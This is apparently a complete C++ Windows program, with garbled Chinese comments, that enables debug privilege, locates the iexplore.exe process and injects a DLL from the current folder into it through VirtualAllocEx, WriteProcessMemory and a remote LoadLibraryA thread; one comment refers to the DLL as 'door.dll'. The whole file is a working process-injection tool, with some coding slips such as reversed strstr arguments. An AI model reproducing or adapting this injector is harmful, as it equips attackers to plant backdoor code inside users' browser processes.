#include<windows.h>
#include <iostream>
#include<tlhelp32.h>
#include<stdio.h>
int EnableDebugPriv(const char * name)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};
	LUID luid;
	//�򿪽������ƻ�
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
	{
		return FALSE;
	}
	//��ý��̱���Ψһ��ID
	if(!LookupPrivilegeValue(NULL,name,&luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		tp.Privileges[0].Luid = luid;
	//����Ȩ��
	if(!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return 0; 
}

BOOL InjectDll(const char *DllFullPath, const DWORD dwRemoteProcessId)
{
	HANDLE hRemoteProcess;
	EnableDebugPriv(SE_DEBUG_NAME);
	//��Զ���߳�
	hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);
	char *pszLibFileRemote;
	//ʹ��VirtualAllocEx������Զ�̽��̵��ڴ��ַ�ռ����DLL�ļ����ռ� 
	pszLibFileRemote = (char *) VirtualAllocEx( hRemoteProcess, NULL, lstrlen(DllFullPath)+1, MEM_COMMIT, PAGE_READWRITE);
	//ʹ��WriteProcessMemory������DLL��·����д�뵽Զ�̽��̵��ڴ�ռ�
	WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (void *) DllFullPath, lstrlen(DllFullPath)+1, NULL);
	//����LoadLibraryA ����ڵ�ַ
	PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryA");
	//����Զ���߳�LoadLibraryA, ͨ��Զ���̵߳��ô����µ��߳�
	HANDLE hRemoteThread;
	if((hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL)) == NULL)
	{
		printf("ע���߳�ʧ��!");
		return FALSE;
	 } 
	 //�ͷž��
	CloseHandle(hRemoteProcess);
	CloseHandle(hRemoteThread);
	return TRUE; 
}

DWORD GetProcessId()
{
	DWORD Pid = -1;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	//����ϵͳ����
	PROCESSENTRY32 lPrs;
	ZeroMemory(&lPrs, sizeof(lPrs));
	lPrs.dwSize = sizeof(lPrs);
	char *targetFile = "iexplore.exe";
	if(!Process32First(hSnap, &lPrs)) //ȡ��ϵͳ�����е�һ��������Ϣ 
	{
		printf("The frist entry of the process list has not been copyied to the buffer");
		return FALSE;
	}
    
	if(strstr(targetFile, lPrs.szExeFile))    //�жϽ�����Ϣ�Ƿ�Ϊ explorer.exe
	{
		Pid = lPrs.th32ProcessID;
		return Pid;
	}
	while(1)
	{
		ZeroMemory(&lPrs, sizeof(lPrs));
		lPrs.dwSize = (&lPrs, sizeof(lPrs));
		if(!Process32Next(hSnap, &lPrs))
		{
			Pid = -1;
			break;
		}
		if(strstr(targetFile, lPrs.szExeFile))
		{
			Pid = lPrs.th32ProcessID;
			break;
		}
	 } 
	 printf("%d",Pid);
	return Pid;
 } 
 
int main()
{
	char myFILE[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, myFILE);
	//ȡ��ǰ·����myFILE
	strcat(myFILE, "\\DLL.dll");   //��ǰ·����door.dll 
	// printf("myFILE");
	//printf("GetProcessId()");
	InjectDll(myFILE, GetProcessId());
	//�����������ע����̵�ID�� 
	return 0;
}









